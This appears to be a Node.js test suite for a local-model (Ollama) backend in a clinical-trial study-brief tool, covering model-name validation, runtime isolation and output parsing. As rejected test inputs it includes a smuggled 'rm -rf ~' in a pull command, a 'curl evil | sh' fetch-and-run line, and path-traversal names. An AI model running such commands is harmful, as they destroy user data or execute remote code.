import test from'node:test';import assert from'node:assert/strict';
import{mkdtemp,mkdir,writeFile,readFile,rm,stat,chmod,realpath}from'node:fs/promises';import os from'node:os';import path from'node:path';import net from'node:net';import{spawn,spawnSync}from'node:child_process';
import{findOllama,manifestPath,hasLocalWeights,listLocalModels,machineProfile,recommend,estimateMemory,memoryFit,structuredTier,OllamaRuntime,MISSING_RUNTIME,PULL_CANDIDATES}from'../local-runtime.mjs';
import{buildLocalBriefRequest,buildLocalRoutingRequest,parseLocalRouting,runLocalStudyBrief,LOCAL_MAX_CLAIMS}from'../local-brief.mjs';
import{PreparedStudyBriefStore}from'../study-brief.mjs';
import{parseApplyRequest,parseApplyReply,parseLocalModelsResult,parseStudyBriefResult,parsePreparedStudyBrief,localTraceBody,studyBriefEngine}from'../../shared/apply-contract.mjs';
import{isLocalModelName}from'../../shared/local-model.mjs';
import{installHost,writeHook,readLines,startHost,poll}from'./host-harness.mjs';
import{MODELS,modelsDir,fakeOllama}from'./fake-ollama-harness.mjs';

const GiB=1024**3;
const alive=pid=>{try{process.kill(pid,0);return true}catch{return false}};
const MACHINE=memoryBytes=>({platform:'macos',arch:'arm64',cpu:'Apple M1 Max',memoryBytes,appleSilicon:true,unifiedMemory:true,freeDiskBytes:20e9});
const synthetic=nctId=>({protocolSection:{identificationModule:{nctId,briefTitle:'Synthetic source fixture; not an identified registry study'},descriptionModule:{briefSummary:'A synthetic example of a controlled platelet study.',detailedDescription:'Two treatments are spaced 4 weeks apart. Follow-up visits occur at 3 and 12 months post injection. Randomization is 2:1 between treatment and sham. Control participants can cross over after 3-month follow-up.'},designModule:{designInfo:{allocation:'RANDOMIZED',maskingInfo:{masking:'SINGLE'}}},statusModule:{overallStatus:'RECRUITING',startDateStruct:{date:'2025-01-01',type:'ACTUAL'}},eligibilityModule:{minimumAge:'18 Years'},contactsLocationsModule:{}}});
async function pinnedLocal(model='qwen3.5:9b',ids=['NCT99999990','NCT99999991']){const s=new PreparedStudyBriefStore({fetchRecord:async id=>synthetic(id),buildLocalRequest:buildLocalBriefRequest}),p=await s.prepare(ids,{engine:{provider:'local',model}});return{s,p,pin:s.take({token:p.token,digest:p.digest})};}

test('model names: only library-style names; paths, hosts, digests, cloud models and free text are refused',()=>{
 for(const ok of['qwen3.5:9b','qwen2.5:14b','gemma4','gemma4:latest','batiai/gemma4-26b:q4','llama3.2:3b-instruct-q4_K_M','nomic-embed-text:latest'])assert.ok(isLocalModelName(ok),ok);
 for(const bad of['','QWEN:9b','../x','a/../b','/abs','qwen3.5/../../etc','hf.co/user/repo:tag','gemma4:cloud','gpt-oss:120b-cloud','a/b/c','qwen 9b','qwen3.5:9b\n','x@sha256:00','a'.repeat(65),'qwen3.:9b','-x','x:','x:-y',null,9,['qwen3.5:9b']])assert.equal(isLocalModelName(bad),false,String(bad));
 const root='/models';assert.equal(manifestPath(root,'qwen3.5:9b'),'/models/manifests/registry.ollama.ai/library/qwen3.5/9b');assert.equal(manifestPath(root,'gemma4'),'/models/manifests/registry.ollama.ai/library/gemma4/latest');assert.equal(manifestPath(root,'batiai/gemma4-26b:q4'),'/models/manifests/registry.ollama.ai/batiai/gemma4-26b/q4');for(const bad of['../x','a/../b','x:..'])assert.equal(manifestPath(root,bad),undefined,bad);
});

test('detection: Ollama is found only at absolute known locations that hold an executable file; PATH is never used',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-find-'));try{
  const notExec=path.join(root,'plain'),exec=path.join(root,'ollama'),link=path.join(root,'link');await writeFile(notExec,'x',{mode:0o644});await writeFile(exec,'#!/bin/sh\n',{mode:0o755});spawnSync('/bin/ln',['-s',exec,link]);
  assert.equal(await findOllama([path.join(root,'missing'),notExec,'relative/ollama',root,'ollama']),undefined);
  assert.equal(await findOllama([path.join(root,'missing'),notExec,link,exec]),await realpath(exec),'symlinks resolve to the real file');
  const saved=process.env.PATH;process.env.PATH=root;try{assert.equal(await findOllama([path.join(root,'nope')]),undefined,'PATH is not searched')}finally{process.env.PATH=saved}
 }finally{await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('installed weights must be local manifests whose model blobs exist with the recorded sizes',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-weights-'));try{const dir=await modelsDir(root,['qwen3.5:9b','gemma4:latest','mirror:latest'],{badBlob:['gemma4:latest']});
  assert.equal(await hasLocalWeights(dir,'qwen3.5:9b'),true);assert.equal(await hasLocalWeights(dir,'gemma4:latest'),false,'blob size mismatch');assert.equal(await hasLocalWeights(dir,'mirror:latest'),false,'remote manifest');assert.equal(await hasLocalWeights(dir,'qwen3:32b'),false,'missing');assert.equal(await hasLocalWeights(dir,'../../x'),false);
 }finally{await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('machine profile: Apple Silicon unified memory, CPU brand, free disk; only fixed fields, no identifiers',async()=>{
 const calls=[],sysctl=async(file,args)=>{calls.push([file,...args]);return args[1]==='machdep.cpu.brand_string'?'Apple M1 Max':'1'};
 const mac=await machineProfile({platform:'darwin',arch:'x64',totalmem:32*GiB,cpuModel:'ignored',sysctl,diskPath:'/x',statfsImpl:async()=>({bavail:1000,bsize:4096})});
 assert.deepEqual(mac,{platform:'macos',arch:'arm64',cpu:'Apple M1 Max',memoryBytes:32*GiB,appleSilicon:true,unifiedMemory:true,freeDiskBytes:4096000},'Rosetta Node still reports Apple Silicon');
 assert.deepEqual(calls.map(c=>c[0]),['/usr/sbin/sysctl','/usr/sbin/sysctl']);
 const intel=await machineProfile({platform:'darwin',arch:'x64',totalmem:16*GiB,sysctl:async(f,a)=>a[1]==='hw.optional.arm64'?'0':'Intel(R) Core(TM) i7\u0007 CPU',statfsImpl:async()=>{throw Error('no disk')}});
 assert.equal(intel.appleSilicon,false);assert.equal(intel.unifiedMemory,false);assert.equal(intel.cpu,'Intel(R) Core(TM) i7 CPU');assert.equal(intel.freeDiskBytes,null);
 const linux=await machineProfile({platform:'linux',arch:'x64',totalmem:8*GiB,cpuModel:'AMD Ryzen',statfsImpl:async()=>({bavail:1,bsize:1})});assert.equal(linux.platform,'linux');assert.equal(linux.cpu,'AMD Ryzen');
 const real=await machineProfile();assert.ok(real.memoryBytes>0);parseLocalModelsResult({kind:'localModels',ollama:{status:'not_installed',version:null},machine:real,models:[],recommendation:recommend({machine:real,models:[],installed:false}).recommendation});
});

test('recommender: 8, 16, 32 and 64 GB machines; installed models first, then a verified pull suggestion; deterministic',()=>{
 const installed=MODELS.filter(m=>m.capabilities.includes('completion')&&!m.remote&&m.name!=='ghost:latest').map(m=>({name:m.name,sizeBytes:m.size,family:m.details.family,parameterSize:m.details.parameter_size??null,quantization:m.details.quantization_level??null}));
 const pick=(gb,models=installed,extra={})=>recommend({machine:{...MACHINE(gb*GiB),...extra},models});
 // 32 GB (the user's M1 Max): qwen3:32b is too large, gemma4 26B is a tight fit, qwen3.5:9b fits comfortably and is strongest at structured output.
 const r32=pick(32);assert.equal(r32.recommendation.kind,'installed');assert.equal(r32.recommendation.model,'qwen3.5:9b');assert.match(r32.recommendation.reason,/fits in 32 GB of memory .*good at structured output/);
 assert.deepEqual(Object.fromEntries(r32.models.map(m=>[m.name,m.fit])),{'qwen3.5:9b':'comfortable','qwen3:32b':'too_large','qwen2.5:14b':'comfortable','gemma4:latest':'comfortable','batiai/gemma4-26b:q4':'tight'});
 assert.deepEqual(r32.models.filter(m=>m.recommended).map(m=>m.name),['qwen3.5:9b']);
 assert.equal(pick(16).recommendation.model,'qwen3.5:9b');assert.equal(pick(64).recommendation.model,'qwen3.5:9b');
 // Without the strong family the next best fitting model wins by tier, then size.
 const others=installed.filter(m=>m.name!=='qwen3.5:9b');assert.equal(pick(32,others).recommendation.model,'qwen2.5:14b');assert.equal(pick(64,others).recommendation.model,'qwen3:32b');
 // 8 GB: nothing installed fits, so a smaller verified model is suggested with the exact pull command. Nothing is pulled.
 const r8=pick(8);assert.equal(r8.recommendation.kind,'pull');assert.equal(r8.recommendation.model,'qwen3.5:2b');assert.equal(r8.recommendation.command,'ollama pull qwen3.5:2b');assert.match(r8.recommendation.reason,/^No installed model fits in 8 GB/);assert.ok(r8.models.every(m=>!m.recommended&&m.fit==='too_large'));
 const tiers=Object.fromEntries([8,16,32,64].map(gb=>[gb,pick(gb,[]).recommendation.model]));assert.deepEqual(tiers,{8:'qwen3.5:2b',16:'qwen3.5:9b',32:'qwen3.5:9b',64:'qwen3.5:27b'});
 assert.match(pick(16,[]).recommendation.reason,/^No local model is installed yet\. qwen3\.5:9b \(about 6\.6 GB download\)/);
 assert.match(recommend({machine:MACHINE(32*GiB),models:[],installed:false}).recommendation.reason,/^After installing Ollama, qwen3\.5:9b/);
 assert.match(pick(16,[],{freeDiskBytes:3e9}).recommendation.reason,/Free at least 8\.6 GB of disk first; 3 GB is free\./,'free disk is checked before suggesting a download');
 assert.equal(pick(4,[]).recommendation.model,'qwen3.5:0.8b');assert.equal(pick(2,[]).recommendation.kind,'none');
 assert.ok(PULL_CANDIDATES.every(c=>isLocalModelName(c.model)));
 assert.deepEqual(pick(32),pick(32),'deterministic');
 assert.equal(structuredTier({name:'qwen3.5:9b',family:'qwen35'}),'strong');assert.equal(structuredTier({name:'mystery:1b',family:'xyz'}),'basic');assert.equal(structuredTier({name:'llama3.2:3b',family:null}),'good');
 assert.equal(memoryFit(estimateMemory(6.6e9),16*GiB),'comfortable');assert.equal(memoryFit(estimateMemory(20.2e9),32*GiB),'too_large');
 for(const gb of[2,4,8,16,32,64]){const r=pick(gb);parseLocalModelsResult({kind:'localModels',ollama:{status:'ready',version:'0.32.1'},machine:MACHINE(gb*GiB),models:r.models,recommendation:r.recommendation});}
});

test('dedicated runtime: own ephemeral 127.0.0.1 port, minimal env with cloud disabled, private HOME, lists only local generation models, killed on stop',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-runtime-'));let rt;try{
  const dir=await modelsDir(root),fake=await fakeOllama(root),userDaemon=net.createServer().listen(0,'127.0.0.1');await new Promise(r=>userDaemon.once('listening',r));
  rt=new OllamaRuntime({binary:fake.binary,modelsDir:dir});await rt.ensure();
  assert.equal(rt.version,'0.99.0');assert.notEqual(rt.port,userDaemon.address().port);assert.notEqual(rt.port,11434);
  const models=await listLocalModels(rt);assert.deepEqual(models.map(m=>m.name),['qwen3.5:9b','qwen3:32b','qwen2.5:14b','gemma4:latest','batiai/gemma4-26b:q4'],'embedding, remote, cloud and weightless models are excluded');
  assert.deepEqual(models[0],{name:'qwen3.5:9b',sizeBytes:6594474711,family:'qwen35',parameterSize:'9.7B',quantization:'Q4_K_M'});
  const start=(await readLines(fake.log)).find(x=>x.event==='start');
  // macOS may add __CF_USER_TEXT_ENCODING to every process; nothing else is inherited.
  assert.deepEqual(start.envKeys.filter(k=>k!=='__CF_USER_TEXT_ENCODING'),['HOME','OLLAMA_HOST','OLLAMA_KEEP_ALIVE','OLLAMA_MAX_LOADED_MODELS','OLLAMA_MAX_QUEUE','OLLAMA_MODELS','OLLAMA_NOPRUNE','OLLAMA_NO_CLOUD','OLLAMA_NUM_PARALLEL','PATH','TMPDIR']);
  assert.equal(start.env.OLLAMA_HOST,`127.0.0.1:${rt.port}`);assert.equal(start.env.OLLAMA_NO_CLOUD,'1');assert.equal(start.env.OLLAMA_NOPRUNE,'1');assert.equal(start.env.OLLAMA_MODELS,dir);assert.equal(start.env.PATH,'/usr/bin:/bin');
  assert.notEqual(start.env.HOME,os.homedir(),'the runtime never sees the user HOME (keys, config)');assert.ok(start.env.HOME.startsWith(await realpath(os.tmpdir()))||start.env.HOME.startsWith(os.tmpdir()));
  for(const k of['OPENAI_API_KEY','HTTPS_PROXY','NODE_OPTIONS'])assert.ok(!start.envKeys.includes(k));
  const pid=Number(await readFile(fake.pidFile,'utf8')),home=rt.home;assert.ok(alive(pid));
  await rt.stop();assert.equal(alive(pid),false,'stopped');await assert.rejects(stat(home),'private HOME removed');
  userDaemon.close();
 }finally{await rt?.stop();await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('runtime failures: exit on start, never listening (timeout), invalid version and ownership loss are LOCAL_RUNTIME_FAILED; the child is killed',async()=>{
 for(const start of['exit','hang','badVersion']){const root=await mkdtemp(path.join(os.tmpdir(),'treatable-runtime-fail-'));let rt;try{const fake=await fakeOllama(root,{start}),dir=await modelsDir(root,['qwen3.5:9b']);rt=new OllamaRuntime({binary:fake.binary,modelsDir:dir,startTimeoutMs:1500});const t=Date.now();await assert.rejects(rt.ensure(),{code:'LOCAL_RUNTIME_FAILED'},start);assert.ok(Date.now()-t<4000,start);const pid=Number(await readFile(fake.pidFile,'utf8').catch(()=>'0'));if(pid)await poll(()=>!alive(pid),3000);assert.equal(rt.child,undefined);}finally{await rt?.stop();await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}}
 // A listener that is not our child process is never trusted.
 const impostor=net.createServer().listen(0,'127.0.0.1');await new Promise(r=>impostor.once('listening',r));const sleeper=spawn('/bin/sleep',['30']);try{const rt=new OllamaRuntime({binary:'/bin/sleep',modelsDir:'/tmp'});Object.assign(rt,{child:sleeper,serverPid:sleeper.pid,port:impostor.address().port});assert.equal(await rt.ownsListener(),false);}finally{sleeper.kill('SIGKILL');impostor.close();}
 await assert.rejects(MISSING_RUNTIME.ensure(),{code:'LOCAL_NOT_INSTALLED'});
});

test('local brief requests carry only the pinned public excerpts and constrain claims to exact source items',async()=>{
 const{s,p,pin}=await pinnedLocal();try{
  parsePreparedStudyBrief(p);assert.deepEqual(p.engine,{provider:'local',model:'qwen3.5:9b'});assert.equal(pin.agentsRequest,undefined,'no Agents request is pinned for a local brief');
  const body=pin.localRequest;assert.equal(body.model,'qwen3.5:9b');assert.equal(body.stream,false);assert.equal(body.options.temperature,0);assert.equal(body.messages.length,3);
  const studies=body.format.properties.studies.prefixItems;assert.equal(studies.length,2);assert.deepEqual(studies.map(x=>x.properties.nctId.const),['NCT99999990','NCT99999991']);
  const alternatives=studies[0].properties.claims.items.anyOf;assert.ok(alternatives.length>0);assert.ok(studies[0].properties.claims.maxItems<=LOCAL_MAX_CLAIMS);
  for(const a of alternatives){const item=pin.briefs[0].items.find(i=>i.id===a.properties.evidenceIds.items.const);assert.equal(a.properties.text.const,item.text);assert.equal(a.properties.sourceQuotes.items.const,item.text);assert.equal(a.properties.category.const,item.category);assert.notEqual(item.context,'registry_milestone')}
  assert.deepEqual(JSON.parse(body.messages[1].content).studies.map(x=>x.untrusted_public_record_text),pin.briefs.map(b=>JSON.parse(JSON.stringify(b))));
  const plans=pin.briefs.map(b=>({nctId:b.nctId,claims:[],questionIds:['visits','costs','next_steps'],prescreenIds:['diagnosis_details','prior_treatments'],flagIds:[],questionEvidence:[{questionId:'visits',evidenceIds:['e2']},{questionId:'costs',evidenceIds:[]},{questionId:'next_steps',evidenceIds:[]}]}));
  const routing=buildLocalRoutingRequest(pin.briefs,plans,'qwen3.5:9b');assert.deepEqual(routing.messages.slice(0,2),body.messages.slice(0,2),'both steps share the cached public prefix');assert.equal(routing.options.num_ctx,body.options.num_ctx,'one context size, so the model is not reloaded');
  const names=routing.format.properties.routes.prefixItems.map(x=>x.properties.name.const);assert.deepEqual(names,['NCT99999990_visits','NCT99999990_costs','NCT99999990_next_steps','NCT99999991_visits','NCT99999991_costs','NCT99999991_next_steps']);
  // Same downgrade and top-3 rules as Decisions; confidence only when the model gave one, never invented.
  const out=parseLocalRouting(JSON.stringify({routes:names.map((name,i)=>({name,route:i===1||i===3?'answered_by_record':'ask_coordinator',...(i===0?{confidence:0.4}:{})}))}),plans);
  assert.deepEqual(out.studyPlans[0].routes.map(r=>r.route),['ask_coordinator','ask_coordinator','ask_coordinator'],'uncited answered_by_record is downgraded');
  assert.deepEqual(out.studyPlans[1].routes.map(r=>r.route),['answered_by_record','ask_coordinator','ask_coordinator']);assert.deepEqual(out.studyPlans[1].routes[0].evidenceIds,['e2']);
  assert.deepEqual(out.studyPlans[1].prioritizedQuestionIds,['costs','next_steps']);assert.deepEqual([...out.confidences],[['NCT99999990_visits',0.4]]);
  for(const bad of['{',JSON.stringify({routes:[]}),JSON.stringify({routes:names.map(name=>({name,route:'maybe'}))}),JSON.stringify({routes:names.map(name=>({name,route:'ask_patient',probability:1}))}),JSON.stringify({routes:names.map(()=>({name:names[0],route:'ask_patient'}))})])assert.throws(()=>parseLocalRouting(bad,plans),{code:'LOCAL_INVALID_OUTPUT'});
  assert.equal(parseLocalRouting(JSON.stringify({routes:names.map(name=>({name,route:'ask_patient',confidence:7}))}),plans).confidences.size,0,'out-of-range confidence is dropped, not clamped');
 }finally{s.clear()}
});

test('local pipeline against the fake runtime: validated brief and routes, model-reported confidence, trace, no OpenAI transport',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-local-run-'));let rt;try{
  const fake=await fakeOllama(root),dir=await modelsDir(root);rt=new OllamaRuntime({binary:fake.binary,modelsDir:dir});const{s,pin}=await pinnedLocal();const trace=[];
  const r=await runLocalStudyBrief(rt,pin,{onTrace:t=>trace.push(t.stage)});parseStudyBriefResult(r);
  assert.equal(r.mode,'local');assert.equal(r.agentStatus,'complete');assert.equal(r.decisionStatus,'complete');assert.deepEqual(r.failureCodes,[]);assert.equal(r.cleanup,'not_started');assert.equal(r.toolCalls,0);
  assert.deepEqual(trace,['local.runtime.start','local.runtime.ready','local.brief.request','local.brief.complete','local.routing.request','local.routing.complete']);
  assert.equal(r.briefs[0].claims.length,1);assert.equal(r.briefs[0].claims[0].text,r.briefs[0].items.find(i=>i.id===r.briefs[0].claims[0].evidenceIds[0]).text);
  assert.deepEqual(r.studyPlans[0].routes.map(x=>x.route),['answered_by_record','ask_coordinator','ask_patient'],'cited answer kept');assert.deepEqual(r.studyPlans[1].routes.map(x=>x.route),['ask_coordinator','ask_coordinator','ask_patient'],'uncited answer downgraded');
  assert.deepEqual(r.studyPlans[1].prioritizedQuestionIds,['still_enrolling','visits']);
  assert.equal(r.local.model,'qwen3.5:9b');assert.equal(r.local.version,'0.99.0');assert.deepEqual(r.local.steps.map(x=>[x.step,x.status]),[['brief','complete'],['routing','complete']]);assert.equal(r.local.confidences.length,6);
  const requests=(await readLines(fake.log)).filter(x=>x.path==='/api/chat');assert.equal(requests.length,2);assert.ok(requests.every(x=>x.body.think===false),'thinking models answer directly');
  assert.deepEqual({...requests[0].body,think:undefined},{...JSON.parse(JSON.stringify(pin.localRequest)),think:undefined},'the pinned body is what was sent');
  assert.match(r.local.steps[0].request.text,/"model": "qwen3\.5:9b"/);
  s.clear();
  // No confidence from the model: none is shown or invented.
  await fake.set({confidence:false});await rt.stop();const again=await pinnedLocal();const r2=await runLocalStudyBrief(rt,again.pin);assert.equal(r2.decisionStatus,'complete');assert.deepEqual(r2.local.confidences,[]);again.s.clear();
 }finally{await rt?.stop();await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('local failures: invalid JSON falls back to the OpenAI-path defaults, timeouts and missing models are labeled, and Stop cancels',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-local-fail-'));let rt;try{
  const fake=await fakeOllama(root,{chat:'invalid'}),dir=await modelsDir(root);rt=new OllamaRuntime({binary:fake.binary,modelsDir:dir});
  let{s,pin}=await pinnedLocal();let r=await runLocalStudyBrief(rt,pin);
  assert.equal(r.agentStatus,'failed');assert.equal(r.decisionStatus,'complete','routing still runs on the default plan, as Decisions does after an Agents failure');assert.deepEqual(r.failureCodes,['LOCAL_INVALID_OUTPUT']);
  assert.deepEqual(r.studyPlans.map(p=>p.questionIds),[['still_enrolling','visits','next_steps'],['still_enrolling','visits','next_steps']]);assert.ok(r.briefs.every(b=>b.claims.length===0&&b.items.length));
  assert.equal(r.local.steps[0].status,'failed');assert.match(r.local.steps[0].output.text,/not json/);s.clear();
  await fake.set({chat:'wrongShape'});({s,pin}=await pinnedLocal());r=await runLocalStudyBrief(rt,pin);assert.deepEqual(r.failureCodes,['LOCAL_INVALID_OUTPUT'],'questionIds that do not match questionEvidence fail the shared validator');s.clear();
  await fake.set({chat:'routingInvalid'});({s,pin}=await pinnedLocal());r=await runLocalStudyBrief(rt,pin);assert.equal(r.agentStatus,'complete');assert.equal(r.decisionStatus,'failed');assert.deepEqual(r.failureCodes,['LOCAL_INVALID_OUTPUT']);assert.ok(r.studyPlans.every(p=>p.routes.every(x=>x.route==='ask_coordinator')));assert.deepEqual(r.local.confidences,[]);s.clear();
  await fake.set({chat:'slow',chatDelay:5000});({s,pin}=await pinnedLocal());let t=Date.now();r=await runLocalStudyBrief(rt,pin,{briefTimeout:600});assert.ok(Date.now()-t<3000);assert.deepEqual(r.failureCodes,['LOCAL_TIMEOUT']);assert.equal(r.decisionStatus,'failed');assert.equal(r.local.steps.length,1,'a timed-out model is not asked again');s.clear();
  await fake.set({chat:'valid'});({s,pin}=await pinnedLocal('qwen3:8b'));r=await runLocalStudyBrief(rt,pin);assert.deepEqual(r.failureCodes,['LOCAL_MODEL_UNAVAILABLE']);assert.equal(r.local.steps.length,0);s.clear();
  ({s,pin}=await pinnedLocal('nomic-embed-text:latest'));r=await runLocalStudyBrief(rt,pin);assert.deepEqual(r.failureCodes,['LOCAL_MODEL_UNAVAILABLE'],'an embedding model cannot write a brief');s.clear();
  ({s,pin}=await pinnedLocal());r=await runLocalStudyBrief(MISSING_RUNTIME,pin);assert.deepEqual(r.failureCodes,['LOCAL_NOT_INSTALLED']);assert.equal(r.local.version,null);s.clear();
  await fake.set({chat:'slow',chatDelay:20000});({s,pin}=await pinnedLocal());const controller=new AbortController();setTimeout(()=>controller.abort(),400);t=Date.now();await assert.rejects(runLocalStudyBrief(rt,pin,{signal:controller.signal}),{code:'CANCELLED'});assert.ok(Date.now()-t<3000);s.clear();
 }finally{await rt?.stop();await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('contract: local engine and local model checks are strict; OpenAI stays the default',()=>{
 const base={id:'x',type:'prepareStudyBrief',payload:{nctIds:['NCT99999990']}};
 assert.equal(studyBriefEngine(parseApplyRequest(base).payload),undefined);assert.equal(studyBriefEngine({provider:'openai'}),undefined);
 assert.deepEqual(studyBriefEngine(parseApplyRequest({...base,payload:{...base.payload,provider:'local',model:'qwen3.5:9b'}}).payload),{provider:'local',model:'qwen3.5:9b'});
 for(const payload of[{provider:'local'},{provider:'local',model:'../x'},{provider:'local',model:'gemma4:cloud'},{provider:'openai',model:'qwen3.5:9b'},{provider:'anthropic'},{provider:'local',model:'qwen3.5:9b',name:'PATIENT_CANARY'},{model:'qwen3.5:9b'}])assert.throws(()=>parseApplyRequest({...base,payload:{...base.payload,...payload}}),JSON.stringify(payload));
 assert.deepEqual(parseApplyRequest({id:'m',type:'localModels',payload:{}}).payload,{});for(const payload of[{model:'qwen3.5:9b'},{nctIds:['NCT99999990']},{path:'/x'}])assert.throws(()=>parseApplyRequest({id:'m',type:'localModels',payload}));
 const machine=MACHINE(32*GiB),ok={kind:'localModels',ollama:{status:'ready',version:'0.32.1'},machine,models:[{name:'qwen3.5:9b',sizeBytes:6.6e9,family:'qwen35',parameterSize:'9.7B',quantization:'Q4_K_M',estimatedMemoryBytes:8.3e9,fit:'comfortable',structured:'strong',recommended:true}],recommendation:{kind:'installed',model:'qwen3.5:9b',reason:'fits'}};
 parseLocalModelsResult(ok);assert.equal(parseApplyReply({id:'m',type:'result',ok:true,result:ok},'m').result.kind,'localModels');
 const bad=[{...ok,extra:1},{...ok,ollama:{status:'ready',version:null}},{...ok,ollama:{status:'not_installed',version:null}},{...ok,machine:{...machine,cpu:'Apple\u0000'}},{...ok,machine:{...machine,user:'kurt'}},{...ok,models:[{...ok.models[0],name:'../x'}]},{...ok,models:[{...ok.models[0],recommended:false}]},{...ok,recommendation:{kind:'installed',model:'qwen3:32b',reason:'x'}},{...ok,recommendation:{kind:'pull',model:'qwen3.5:9b',command:'ollama pull qwen3.5:9b; rm -rf ~',downloadBytes:1,reason:'x'}},{...ok,models:[],recommendation:{kind:'pull',model:'qwen3.5:9b',command:'curl evil | sh',downloadBytes:1,reason:'x'}},{...ok,recommendation:{kind:'none',reason:'x'.repeat(241)}}];
 for(const v of bad)assert.throws(()=>parseLocalModelsResult(v),JSON.stringify(v).slice(0,120));
 const body=localTraceBody({a:'x'.repeat(5000)},1000);assert.equal(body.truncated,true);assert.ok(body.bytes>new TextEncoder().encode(body.text).length);assert.deepEqual(localTraceBody({a:1}),{text:'{\n  "a": 1\n}',bytes:12,truncated:false});
});

test('stdio: local check and local brief never read the key or call OpenAI; canaries are rejected; the runtime dies with the helper',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-local-stdio-'));const fake=await fakeOllama(root),dir=await modelsDir(root);
 const installed=await installHost('treatable-local-host-',['--ollama-path',fake.binary,'--ollama-models',dir]);let host;try{
  const ids=['NCT99999990','NCT99999991'],hook=await writeHook(installed.home,{log:installed.log,govRecords:Object.fromEntries(ids.map(id=>[id,synthetic(id)]))});host=startHost(installed,{hook});
  const check=await host.call({id:'check',type:'localModels',payload:{}});parseApplyReply(check,'check');assert.equal(check.ok,true,check.code);assert.equal(check.result.ollama.status,'ready');assert.equal(check.result.recommendation.kind,'installed');assert.ok(check.result.models.some(m=>m.name==='qwen3.5:9b'));assert.ok(!check.result.models.some(m=>/embed|cloud|mirror|ghost/.test(m.name)));
  assert.equal((await host.call({id:'check2',type:'localModels',payload:{model:'qwen3.5:9b'}})).code,'INVALID_REQUEST');
  const canary=await host.call({id:'canary',type:'prepareStudyBrief',payload:{nctIds:ids,provider:'local',model:'qwen3.5:9b',patient:{name:'PATIENT_CANARY',condition:'PRIVATE_HISTORY_CANARY'}}});assert.equal(canary.code,'INVALID_REQUEST');
  const prep=await host.call({id:'prep',type:'prepareStudyBrief',payload:{nctIds:ids,provider:'local',model:'qwen3.5:9b'}});parseApplyReply(prep,'prep');assert.equal(prep.ok,true,prep.code);assert.deepEqual(prep.result.engine,{provider:'local',model:'qwen3.5:9b'});
  const run=await host.call({id:'run',type:'executeStudyBrief',payload:{token:prep.result.token,digest:prep.result.digest}});parseApplyReply(run,'run');assert.equal(run.ok,true,run.code);assert.equal(run.result.mode,'local');assert.equal(run.result.agentStatus,'complete');assert.equal(run.result.decisionStatus,'complete');
  const traces=host.frames.filter(f=>f.id==='run'&&f.type==='trace').map(f=>f.trace.stage);assert.deepEqual(traces,['local.runtime.start','local.runtime.ready','local.brief.request','local.brief.complete','local.routing.request','local.routing.complete']);
  let reads='';try{reads=await readFile(installed.reads,'utf8')}catch{}assert.equal(reads,'','no Keychain read for a local brief or check');
  assert.equal((await readLines(installed.log)).filter(x=>x.host==='api.openai.com').length,0,'nothing was sent to OpenAI');
  const ollamaLog=await readLines(fake.log),serialized=JSON.stringify([ollamaLog,host.frames,host.stderr()]);assert.ok(!serialized.includes('PATIENT_CANARY')&&!serialized.includes('PRIVATE_HISTORY_CANARY'));
  const chats=ollamaLog.filter(x=>x.path==='/api/chat');assert.equal(chats.length,2);for(const c of chats)assert.deepEqual(Object.keys(c.body).sort(),['format','keep_alive','messages','model','options','stream','think']);
  assert.equal((await host.call({id:'again',type:'executeStudyBrief',payload:{token:prep.result.token,digest:prep.result.digest}})).code,'INVALID_APPLY_RECEIPT');
  // Chrome may SIGKILL the helper; the watchdog still stops the dedicated runtime because the helper's pipe closes.
  const pid=Number(await readFile(fake.pidFile,'utf8')),runtimeHome=ollamaLog.find(x=>x.event==='start').env.HOME;assert.ok(alive(pid));host.child.kill('SIGKILL');await host.exit;host=undefined;await poll(()=>!alive(pid),5000);await poll(async()=>!(await stat(runtimeHome).catch(()=>false)),5000);
 }finally{host?.child.kill('SIGKILL');await rm(installed.home,{recursive:true,force:true});await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('stdio: Ollama missing gives a not-installed check with a pull suggestion, and a local brief reports LOCAL_NOT_INSTALLED without touching OpenAI',async()=>{
 const root=await mkdtemp(path.join(os.tmpdir(),'treatable-local-missing-'));const installed=await installHost('treatable-local-missing-host-',['--ollama-path',path.join(root,'no-ollama-here'),'--ollama-models',path.join(root,'models')]);let host;try{
  const ids=['NCT99999990'],hook=await writeHook(installed.home,{log:installed.log,govRecords:{NCT99999990:synthetic('NCT99999990')}});host=startHost(installed,{hook});
  const check=await host.call({id:'check',type:'localModels',payload:{}});assert.equal(check.ok,true);assert.equal(check.result.ollama.status,'not_installed');assert.deepEqual(check.result.models,[]);assert.ok(['pull','none'].includes(check.result.recommendation.kind));
  const prep=await host.call({id:'prep',type:'prepareStudyBrief',payload:{nctIds:ids,provider:'local',model:'qwen3.5:9b'}});assert.equal(prep.ok,true,prep.code);
  const run=await host.call({id:'run',type:'executeStudyBrief',payload:{token:prep.result.token,digest:prep.result.digest}});assert.equal(run.ok,true,run.code);assert.deepEqual(run.result.failureCodes,['LOCAL_NOT_INSTALLED']);assert.equal(run.result.agentStatus,'failed');
  assert.equal((await readLines(installed.log)).filter(x=>x.host==='api.openai.com').length,0);host.child.stdin.end();await host.exit;host=undefined;
 }finally{host?.child.kill('SIGKILL');await rm(installed.home,{recursive:true,force:true});await rm(root,{recursive:true,force:true,maxRetries:10,retryDelay:100})}
});

test('installer: Ollama overrides are refused outside an isolated test home, before anything is written',()=>{
 // /var/empty is root-owned, so even a faulty check could not write there.
 const r=spawnSync(process.execPath,[new URL('../install.mjs',import.meta.url).pathname,'--home','/var/empty/treatable-test','--ollama-path','/tmp/x','--ollama-models','/tmp/y'],{encoding:'utf8'});
 assert.notEqual(r.status,0);assert.match(r.stderr,/accepted only for isolated test installs/);
});

/* Local backend for AI result ranking. */
import{runLocalRanking,buildLocalRankRequest,parseLocalRankOutput}from'../local-rank.mjs';
